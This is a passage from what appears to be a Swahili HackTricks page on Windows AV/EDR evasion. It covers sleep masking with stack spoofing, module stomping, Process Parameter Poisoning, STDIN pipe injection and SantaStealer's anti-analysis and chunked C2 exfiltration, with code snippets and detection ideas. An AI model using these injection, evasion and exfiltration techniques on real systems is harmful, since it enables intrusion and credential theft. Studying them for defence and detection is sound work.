- Chagua thread nyingine katika process hiyo hiyo na usome mipaka ya stack ya `NT_TIB` / TEB (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya thread ya sasa.
- Nasa context halisi ya thread inayolala kwa `GetThreadContext`.
- Nakili **`Rip` halisi pekee** kwenye spoof context, huku hali ya `Rsp`/stack iliyospoofiwa ikiendelea kama ilivyo.
- Wakati wa sleep window, nakili `NT_TIB` ya thread iliyospoofiwa kwenye TEB ya sasa ili stack walkers zifuatilie stack range halali.
- Baada ya wait kukamilika, rejesha TIB na thread context ya awali.

Hii huhifadhi instruction pointer inayolingana na CET huku ikipotosha EDR stack walkers zinazotegemea metadata ya stack ya TEB kuthibitisha unwinds.

### Njia mbadala inayotegemea APC: Kraken Mask

Ikiwa dispatch ya timer-queue ina signature inayotambulika mno, mfuatano huohuo wa sleep-encrypt-spoof-restore unaweza kutekelezwa kutoka kwenye helper thread iliyosimamishwa kwa kutumia APCs zilizowekwa foleni:<sup>[[27]](#references)</sup>

- Tengeneza helper thread yenye `NtTestAlert` kama entrypoint.
- Weka foleni ya `CONTEXT` frames/APCs zilizotayarishwa kwa `NtQueueApcThread` na uzitekeleze kwa `NtAlertResumeThread`.
- Hifadhi hali ya chain kwenye heap badala ya stack ya helper ili kuepuka kujaa kwa thread stack ya kawaida ya 64 KB.
- Tumia `NtSignalAndWaitForSingleObject` kutoa ishara ya start event na kuzuia thread kwa atomiki.
- Simamisha main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza muda wa race ambapo scanner inaweza kunasa stack iliyorejeshwa kwa sehemu.

Hii hubadilisha signature ya `CreateTimerQueueTimer` + `NtContinue` na kuweka signature ya helper-thread/APC, huku ikihifadhi malengo yaleyale ya RC4 masking na stack-spoofing.

Mawazo ya ziada ya detection
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits, au APC dispatch.
- `GetThreadContext`/`SetThreadContext` zikitumiwa pamoja na `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na writes za moja kwa moja kwenye mipaka ya stack ya TEB/TIB ya thread ya sasa.
- Chains za `NtQueueApcThread`/`NtAlertResumeThread` zinazofikia kwa njia isiyo ya moja kwa moja `SystemFunction032`, `VirtualProtect`, au helpers za kurejesha ruhusa za sections.
- Matumizi yanayojirudia ya gadget signatures fupi kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya modules zilizotiwa saini.


## Precision Module Stomping

Module stomping huendesha payloads kutoka kwenye **sehemu ya `.text` ya DLL ambayo tayari imepakiwa ndani ya process lengwa** badala ya kutenga memory ya faragha inayoweza kutekelezwa na inayoonekana wazi, au kupakia DLL mpya ya kutumika kama sadaka. Target ya overwrite inapaswa kuwa **image iliyopakiwa kutoka kwenye diski** ambayo nafasi yake ya code inaweza kutosha payload bila kuharibu code paths ambazo process bado inahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Kuchagua target kwa uhakika

Stomping ya kijuujuu dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si ya kutegemewa: huenda DLL haijapakiwa kwenye remote process, na eneo dogo mno la code litasababisha process ku-crash. Workflow ya kutegemewa zaidi ni:

1. Orodhesha modules za process lengwa na uhifadhi **orodha ya kujumuisha yenye majina pekee** ya DLL zilizopakiwa tayari.
2. Jenga payload kwanza na rekodi **ukubwa wake halisi kwa bytes**.
3. Changanua DLL zinazowezekana kwenye diski na ulinganishe PE section **`.text` `Misc_VirtualSize`** na ukubwa wa payload. Hili ni muhimu zaidi kuliko ukubwa wa file kwa kuwa linaonyesha ukubwa wa executable section **inapomapishwa kwenye memory**.
4. Changanua **Export Address Table (EAT)** na uchague RVA ya function iliyosafirishwa kama offset ya kuanzia ya stomp.
5. Kokotoa **blast radius**: ikiwa payload inazidi mipaka ya function iliyochaguliwa, itafuta exports zilizo karibu ambazo zimepangwa baada yake kwenye memory.

Zana za kawaida za recon/uchaguzi zinazotumika:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Pendelea DLL ambazo **tayari zimepakiwa** katika mchakato wa mbali ili kuepuka telemetry ya `LoadLibrary`/upakiaji wa picha usiotarajiwa.
- Pendelea exports ambazo programu lengwa huzitekeleza mara chache; vinginevyo, njia za kawaida za utekelezaji zinaweza kufikia bytes zilizobadilishwa kabla au baada ya kuunda thread.
- Implants kubwa mara nyingi huhitaji kubadilisha jinsi shellcode inavyopachikwa kutoka kwenye string literal hadi **byte-array/braced initializer** ili buffer nzima iwakilishwe ipasavyo kwenye source ya injector.

Mawazo ya ugunduzi
- Uandishi wa mbali ndani ya kurasa zinazotekelezeka zinazoungwa mkono na picha (`MEM_IMAGE`, `PAGE_EXECUTE*`), badala ya allocations za kawaida zaidi za private RWX/RX.
- Entry points za export ambazo bytes zake zilizo kwenye memory hazilingani tena na faili inayozitegemeza kwenye diski.
- Remote threads au mabadiliko ya muktadha wa utekelezaji yanayoanza ndani ya export halali ya DLL ambayo bytes zake za mwanzo zimebadilishwa hivi karibuni.
- Mfuatano unaotiliwa shaka wa `VirtualProtect(Ex)` / `WriteProcessMemory` unaolenga kurasa za `.text` za DLL, ukifuatiwa na uundaji wa thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni mbinu ya **process-injection / EDR-evasion** inayokwepa njia ya kawaida ya remote write (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes kwenye target ambayo tayari inaendesha, inatumia ukweli kwamba Windows **hunakili baadhi ya vigezo vya kuanzisha `CreateProcessW` vilivyochaguliwa hadi kwenye mchakato child** na kuvihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers zinazoweza kuwekewa data hatari na kunakiliwa na `CreateProcessW`

Carriers zinazofaa ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (pamoja na `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya carriers kwa matumizi ya vitendo:

- `lpCommandLine` lazima ielekeze kwenye **memory inayoweza kuandikwa** kwa ajili ya `CreateProcessW`, na ina kikomo cha **herufi 32,767 za Unicode**, ikijumuisha null terminator.
- `lpEnvironment` lazima iwe environment block ya Unicode yenye string za mfululizo za `NAME=VALUE\0` na kuishia na `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hivyo uhusishaji wa `ShellInfo` unapaswa kuchukuliwa kuwa maelezo ya utekelezaji badala ya mkataba thabiti ulioandikwa rasmi.

Hii hubadilisha uundaji wa kawaida wa mchakato kuwa **primitive ya kuhamisha payload**. Operator huunda mchakato child kwa data ya kuanzisha inayodhibitiwa na mshambuliaji na kuiacha Windows ifanye nakala kati ya michakato.

### Mtiririko wa kutafuta data ya mbali bila API za remote write

Baada ya child kuundwa, tafuta buffer iliyonakiliwa kwa kutumia primitives za **kusoma pekee**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma `PEB` ya mbali
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Mtiririko wa chini kabisa:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kutekeleza buffer ya parameter iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida ni `RW`, si la kutekelezeka. Msururu wa kawaida wa P3 ni:

1. Unda process kama kawaida (bila kuisimamisha)
2. Fanya ukurasa uliochaguliwa wa parameter uweze kutekelezeka kwa `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena handle ya main thread ambayo tayari imerudishwa kwenye `PROCESS_INFORMATION`
4. Elekeza upya utekelezaji kwa `NtSetContextThread` (`CONTEXT_CONTROL`, andika juu ya `RIP`)

Tofauti na workflows za kawaida za thread hijacking, hii **haihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kwenye handle ya main thread iliyorudishwa.

Hii huepusha API kadhaa ambazo hufuatiliwa mara nyingi kwa ajili ya injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha byte null na shellcode ya hatua kwa hatua

Carrier zote tatu ni data za **string au zinazofanana na string**, kwa hiyo payload ghafi iliyo na `0x00` hukatizwa wakati wa uhamishaji. Suluhisho linalofaa ni kutumia **hatua ya kwanza isiyo na null** ambayo huunda upya constants wakati wa utekelezaji na kisha kupakia hatua ya pili ya aina yoyote.

Muundo rahisi ni usanisi wa constant unaotegemea XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Hii huruhusu hatua ya kwanza kuunda strings za stack, arguments za API, njia za DLL, au loader ya shellcode ya hatua ya pili bila kuweka null bytes kwenye parameter inayosafirishwa.

### Wito wa API unaotumia stack kutoka hatua ya kwanza

Hatua ya kwanza inapohitaji kuita API kama `LoadLibraryA`, inaweza:

- kusukuma string/buffer kwenye stack ya lengo
- kutenga **nafasi ya shadow ya x64 yenye ukubwa wa baiti 32**
- kuweka `RCX`, `RDX`, `R8`, `R9` kuwa constants au pointers zinazohusiana na `RSP`
- kuhakikisha `RSP` imepangiliwa kwa **baiti 16** kabla ya wito

Kisha hatua ya pili inaweza kunakiliwa kutoka stack hadi kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa `VirtualProtect`, na kurukia huko, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Mawazo ya kugundua

Fursa nzuri za kutafuta zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` zikifanya kurasa za process-parameter ziwe executable
- mabadiliko hayo ya ulinzi yakifuatiwa na `SetThreadContext` / `NtSetContextThread`
- usomaji wa mbali wa `PEB` kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu au zenye entropy kubwa isiyo ya kawaida wakati wa kuunda process

### Vidokezo

- P3 ni **mbinu ya kuhamisha data kati ya processes**, si primitive kamili ya utekelezaji yenyewe: parameter iliyonakiliwa bado inahitaji mabadiliko ya ruhusa ya utekelezaji na mbinu ya kuelekeza utekelezaji.
- Waandishi walizingatia `RtlCreateProcessReflection` / Dirty Vanity lakini wakaikataa kwa sababu ndani yake hutumia primitives zinazotia shaka, kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## Uingizaji wa pipe ya Console STDIN

Child ya console inayoingiliana inaweza pia kutumika kama **primitive ya kuhamisha payload**. Injector huelekeza standard input ya child kwenye pipe na kutuma marker ikifuatiwa na shellcode. Baada ya programu ya console kusoma data na kuiweka kwenye memory yake binafsi, injector hupata buffer hiyo, huifanya iwe executable na kuelekeza thread ya child huko. Hii huepuka `VirtualAllocEx` na `WriteProcessMemory`, lakini bado ni process injection, si njia ya jumla ya kukwepa EDR.<sup>[[41]](#references)</sup>

Licha ya maelezo ya "named-pipe", implementation ya rejeleo huita `CreatePipe`, ambayo huunda **anonymous pipe**. Windows hutekeleza anonymous pipes kwa kutumia pipe objects zenye majina ya kipekee ndani ya mfumo, lakini PoC haitumii njia ya `\\.\pipe\<name>` wala kuita `CreateNamedPipe`. Huunda handles zinazorithiwa zikiwa na security descriptor chaguomsingi, huweka handle ya kusoma kwenye `STARTUPINFO.hStdInput`, huweka `STARTF_USESTDHANDLES`, na kuzindua child mpya huku urithishaji wa handle ukiwa umewezeshwa. Kwa hiyo, PoC hii huzindua console executable iliyotolewa; haiunganishi pipe yake kwenye process iliyopo.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Mfuatano wa hatua za rejeleo

Implementation hutumia mfuatano ufuatao:<sup>[[41]](#references)</sup>

1. Unda jozi za anonymous pipe kwa `STDIN` na `STDOUT` za child. Ondoa urithishaji kwenye handles mbili zilizo upande wa parent na ufunge nakala za upande wa child katika parent baada ya kuunda process.
2. Zindua executable inayoingiliana kama `netsh.exe` au `nslookup.exe` kwa `CREATE_NEW_CONSOLE`. Child hurithi standard handles zilizoelekezwa upya.
3. Tuma array nzima ya binary `rawData` kwa `WriteFile` kupitia handle ya `STDIN` iliyo upande wa parent. Programu ya console hutumia baiti hizo na kuacha nakala katika mojawapo ya maeneo yake binafsi yaliyotengewa memory.
4. Pitia nafasi ya anwani ya child kwa `VirtualQueryEx`, soma maeneo yanayoweza kuwa `MEM_PRIVATE` kwa `ReadProcessMemory`, kisha utafute marker mwanzoni mwa `rawData`.
5. Badilisha buffer iliyopatikana kuwa `PAGE_EXECUTE_READWRITE` kwa `VirtualProtectEx`.
6. Tambua thread kuu, isimamishe, weka `RIP` kuwa `found_address + 0x19` kwa `NtSetContextThread`, kisha iendelee.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Utekelezaji uliotolewa ni mahususi kwa x64: unarekebisha `CONTEXT.Rip`, na payload yake iliyopachikwa ni shellcode ya x64. `rawData` huanza na alama ya baiti 25, kwa hiyo baiti zinazoweza kutekelezwa huanza kwenye offset ya heksadesimali `0x19`. Unapobadilisha payload, hifadhi mpangilio huo au usasishe alama, vector ya utafutaji, ukubwa wa array na offset ya utekelezaji kwa pamoja. Maoni ya chanzo pia yanaorodhesha `0x0A`, `0x0D` na `0x1A` kama herufi zisizofaa. Mtiririko huu haubadilishi tokeni au privileges za mchakato mtoto.<sup>[[41]](#references)</sup>

Kwa mifumo ya kuunda native helpers ndogo na payload, angalia [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Mbinu za SantaStealer za Kuepuka Ugunduzi Bila Faili na Kuiba Credentials

SantaStealer (pia hujulikana kama BluelineStealer) inaonyesha jinsi info-stealers za kisasa zinavyounganisha AV bypass, anti-analysis na ufikiaji wa credentials katika mtiririko mmoja wa kazi.<sup>[[24]](#references)</sup>

### Uchujaji kwa mpangilio wa kibodi & kuchelewesha sandbox

- Alama ya config (`anti_cis`) huhesabu mipangilio ya kibodi iliyosakinishwa kupitia `GetKeyboardLayoutList`. Ikiwa mpangilio wa Kicyrillic utapatikana, sample huacha alama tupu ya `CIS` na kusitisha utekelezaji kabla ya kuendesha stealers, hivyo kuhakikisha haitekelezwi katika maeneo yaliyotengwa huku ikiacha artifact ya kutafutwa.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mantiki ya tabaka nyingi ya `check_antivm`

- Variant A hupitia orodha ya process, huhesabu hash ya kila jina kwa checksum maalum ya rolling, na kulinganisha matokeo na blocklist zilizopachikwa za debugger/sandbox; hurudia checksum kwa jina la kompyuta na hukagua working directory kama `C:\analysis`.
- Variant B hukagua sifa za mfumo (kikomo cha chini cha idadi ya process, uptime ya hivi karibuni), huita `OpenServiceA("VBoxGuest")` ili kugundua VirtualBox additions, na hukagua muda wa utekelezaji wakati wa kusubiri ili kubaini single-stepping. Ikigundua dalili yoyote, husitisha kabla modules hazijazinduliwa.

### Helper isiyoacha faili + reflective loading ya double ChaCha20

- DLL/EXE kuu hupachika Chromium credential helper ambayo ama huandikwa kwenye diski au huwekwa mwenyewe kwenye memory; katika fileless mode, hutatua imports/relocations yenyewe ili kusiandikwe helper artifacts.
- Helper hiyo huhifadhi DLL ya hatua ya pili iliyosimbwa mara mbili kwa ChaCha20 (keys mbili za biti 32 + nonces za biti 12). Baada ya hatua zote mbili, hui-load blob kwa reflective loading (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zinazotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Routines za ChromElevator hutumia direct-syscall reflective process hollowing ku-inject kwenye Chromium browser inayoendelea, kurithi AppBound Encryption keys, na kusimbua passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya uimarishaji wa ABE.

### Ukusanyaji wa modular ndani ya memory na uhamishaji wa data wa HTTP kwa vipande

- `create_memory_based_log` hupitia jedwali la kimataifa la function-pointer `memory_generators` na kuanzisha thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti idadi ya faili baada ya muda wa kujiunga wa takriban sekunde 45.
- Baada ya kumaliza, kila kitu huwekwa kwenye ZIP kwa kutumia library ya `miniz` iliyounganishwa kwa statically kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` husubiri sekunde 15 na kutiririsha archive kwa vipande vya MB 10 kupitia HTTP POST kwenda `http://<C2>:6767/upload`, huku ikighushi browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, na kwa hiari `w: <campaign_tag>`; kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa kuunganisha upya kumekamilika.

## References

- [1] [Ujanja wa Juu wa Kukwepa Ugunduzi: Module Stomping kwa Usahihi](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blogu](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: hakuna tena nafasi za bure kwa malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – nyaraka](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – mfano](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – mfano](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC ya kughushi call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Mnyororo Mpya wa Maambukizi na Obfuscation ya ConfuserEx kwa DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kukwepa ukaguzi wa mkao wa Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Kutumia Vibaya Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Orodha ya Forwarded Exports za Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Mpangilio wa utafutaji wa dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Usalama wa process na haki za ufikiaji](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Rejea ya EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Kizindua cha CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Kukabiliana na EDR kwa Msaada wa Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Vunja Ganda la Ulinzi la Windows Defender kwa Mbinu ya Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Rejea ya amri ya mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Chini ya Pazia Safi: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Inakuja Mjini: Infostealer Mpya yenye Malengo Makubwa](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Usimbuaji wa Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Kushinda Malware ya Node.js kwa Kufuatilia API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Mrembo Aliyelala: Kumlaza Adaptix kwa Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Uwekaji Sumu wa Vigezo vya Process](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Mrembo Aliyelala II: CFG, CET, na Kughushi Stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ufiche wa usingizi wa Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Kuficha Dotnet Etw Yako](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kutumia Vibaya Chrome Remote Desktop katika Operesheni za Red Team: Mwongozo wa Vitendo](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Kugeuza Driver ya Urekebishaji ya Defender kuwa Primitive ya Operesheni za Kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Msimbo saidizi wa MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Kuunda Functions Zinazojificha kwa Kutumia LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Msimbo chanzo wa TwoSevenOneT InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Function ya CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kuunda Child Process yenye Input na Output Zilizoelekezwa Upya](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
